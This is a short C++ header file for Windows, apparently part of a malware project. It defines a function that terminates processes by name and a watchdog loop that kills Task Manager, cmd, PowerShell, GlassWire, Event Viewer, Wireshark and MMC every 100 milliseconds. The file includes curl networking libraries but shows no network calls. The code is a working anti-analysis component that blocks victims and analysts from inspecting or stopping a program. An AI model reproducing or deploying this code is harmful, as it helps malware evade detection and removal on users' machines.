#pragma once
#include <Windows.h>
#include <cpr/cpr.h>
#include <curl/curl.h>
#include <string>
#include <process.h>
#include <TlHelp32.h>
#include <iostream>

void killProcess(const char* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
  
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
      
			if (hProcess != 0)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
      
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

void watchDog() {
	std::vector<const char*> processes = { "Taskmgr.exe","cmd.exe","powershell.exe","glasswire.exe","eventvwr.exe","wireshark.exe","mmc.exe" };

	while (1) {
		for (uint32_t i = 0; i < processes.size(); i++) {
			killProcess(processes[i]);
		}

		Sleep(100);
	}
}
